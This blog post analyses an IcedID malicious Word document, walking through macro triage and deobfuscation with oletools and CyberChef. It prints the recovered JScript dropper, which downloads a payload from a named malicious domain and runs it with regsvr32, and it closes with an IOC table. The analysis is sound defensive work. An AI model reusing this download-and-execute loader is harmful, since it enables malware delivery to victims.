---
layout: post
title:  "IcedId Maldoc"
---

Browsing through [AnyRun](https://app.any.run/tasks/3f121e8d-95d6-4c9f-90e2-bb57a4ddf697/), I found an interesting sample. 


Let's take a look at it.

If you don't have a copy of Office available, it's still easy to analyze with [OleTools](https://github.com/decalage2/oletools) and [CyberChef](https://gchq.github.io/CyberChef/). 

I always like to look inside the doc for any images. This helps me understand the lures used. CyberChef has a recipe to "Extract Files". You can use this to easily preview images. In this case, the image alone makes this *highly suspicious*. This is the traditional "This document was created in an earlier version of Word" lure.  


![18cad07a4fe5e160b924fb4818e3380e.png](/_posts/_resources/d9526c32abc848b597e66e2615191886.png)


Malicious Word documents typically do one of three things:

1. Execute macros
2. Link to a URL containing the malicious payload
3. Exploit Word itself, usually [CVE–2017–11882](https://blog.morphisec.com/microsoft-equation-editor-backdoor) 

Running `olevba -a ingresso.03.26.21.doc` performs triage analysis on the macro and highlights suspicious items. 

![648a2336d5d74ff831b7b742e17dd3b8.png](/_posts/_resources/5f24a20247d84cf7948244b0d9b71c69.png)

There are several things that stand out here that will guide our analysis. The macro:

1. Auto-executes on open
2. Creates a file
3. Executes a shell command
4. Contains encoded/obfuscated strings

To make understanding the macro code easier, I prefer to dump it out to a text file (`olevba ingresso.03.26.21.doc > macro.txt`) and open it up in Notepad++. I love Notepad++ for the language specific syntax coloring, and that selecting text will highlight it elsewhere in the document. These two things help a lot when deobfuscating scripts. 

I take a once over for the full macro, then focus in on one component I find most interesting. If you don't know where to start, the shell command is always a solid choice. 



![6f9193d37b7041b3fb47c3b8ab145ed1.png](/_posts/_resources/c5cb9f692a3040908c3e1e3840d87c3d.png)



What we can see here is that a `wscript.shell` object is stored in a variable called `documentViewTitle`. The `exec` [function](https://www.vbsedit.com/html/5593b353-ef4b-4c99-8ae1-f963bac48929.asp) of this object is then called with the arguments pulled from `ptrMem` and `WExceptionLink`, after using the `Replace()` function to remove the 1s used to obfuscate the code. Looking at these variables, they seem to source from some form object contained in the document. If we use the `oledump` tool, we can see this object.


![9bd3219588cd7345cb28fb79958f8631.png](/_posts/_resources/249176739ae042389500f2e49ed828bf.png)

If we select the appropriate streams, we see the command `c:\windows\explorer.exe c:\users\public\main.hta` come to light.


![a6898a7ea7b51b7543256fd913b14ecb.png](/_posts/_resources/7a0d96156ed2434ab552b1bde522c5a9.png)

Thinking back to our triage of the sample, this HTA file is likely the file that's created by the macro. Zeroing in on that code...



![3ee7508bf8e27fbdf56648d082c01463.png](/_posts/_resources/9380db033d3f4293a99640d326b16b92.png)


We can look up the documentation for the `CreateTextFile` [method](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/createtextfile-method) and it tells us that the argument will be the filename, so `borderBorderEx` eventually deobfuscates to `main.hta`, but `queryProc` will be the contents of the file, and much more interesting. 

If we use Notepad++ to select the function `textboxTable` we can find the places it is called in the code, and analyze the contents of the second argument. The second argument to `textboxTable` is the contents of the HTA file. 


![9d44f30bd645a83a3e00fe2c93ae6954.png](/_posts/_resources/df31519e7eb34efd912ef21db61b3f17.png)

Let's follow `argumentExceptionButton` and see what its contents are.


![2c6b410657946e6282c9d47e5720bf9d.png](/_posts/_resources/c6656556ce9a4d74a4be68d974711a42.png)

Essentially, it's this huge word wrap of other variables concatenated. The variables are defined above, so we can do a find and replace - replacing the variable names with their content. Once you've finished with the tedious work, you'll see the HTA file contents. 


![fd36f4d06a247a2ffb08803d348ce962.png](/_posts/_resources/3f87bc7ed60845919527a7df8469cbd2.png)

Once you clean up this code a little, getting rid of the extraneous `+` and `"` symbols, you'll see a long string in the `<div>` tag. One of the things that immediately stands out is the character set and that it ends with an equals sign. Without taking the time to understand any of the decoding algorithm underneath, I have a strong suspicion that it's base64 encoded. Let's test in CyberChef. 


![8a013579e2ded609a263c08262e9c7ae.png](/_posts/_resources/5720f3a32c1c478895a2b0398523255e.png)

It definitely decodes properly, but it looks weird. Applying the "Reverse" recipe will put the characters in the correct order, resulting in the following code that will be executed by the HTA file.

```
new ActiveXObject("wscript.shell").run("regsvr32 c:\\users\\public\\collectionMemory.jpg");
var buttonPasteLeft = new ActiveXObject("scripting.filesystemobject");
try {
    buttonPasteLeft.deletefile("c:\\users\\public\\main.hta");
} catch(nextTrust) {}

var listboxTableRequest = new ActiveXObject("msxml2.xmlhttp");
listboxTableRequest.open("GET", "http://brown-craft-2018.com/fdvdd/sAyRdZ1iUxUFSEiaXlMxv4sYlMVcPX/Oz6qD6um7u2XDeRs0hvyB6/fFfWhs1ayr1Sp4kiHky8LFM/4Cr408QvrXy5Q9LFbjdzVx/naw15?id=bgZ5DeL6cVNx69&id=h6", false);
listboxTableRequest.send();
if (listboxTableRequest.status == 200)  {
    var documentRight = new ActiveXObject("adodb.stream");
    documentRight.open;
    documentRight.type = 1;
    documentRight.write(listboxTableRequest.responsebody);
    documentRight.savetofile("c:\\users\\public\\collectionMemory.jpg", 2);
    documentRight.close;
}
```

This HTA file will retrieve the remote file named `collectionMemory.jpg` and attempt to execute it with `regsvr32`. Unfortunately, by the time Any.Run or myself were able to get to it, it seems like this file no longer exists.


![9ea24f09d0b510a34031a3a537fba29d.png](/_posts/_resources/c324949225cb49aaa82ebafcd05456fb.png)


However, @reecDeep on [Twitter](https://twitter.com/reecdeep/status/1375385369462575106) reported a ***similar*** sample from a few days prior and the follow on payload was uploaded to [tria.ge](https://tria.ge/210326-g3jcevvnd6).


IOC Type|Value
---|------
filename|ingresso.03.26.21.doc
filename|c:\users\public\collectionMemory.jpg
filename|c:\users\public\main.hta
md5|ff39fc0c398db11d51982220d6b7b45c
sha256|d44d2da0f8cd163c6d36e4f71b35dcd21c76e639caff11cd94b005c6fad78ba5
domain|brown-craft-2018[.]com 
ip|45.150.67[.]40 






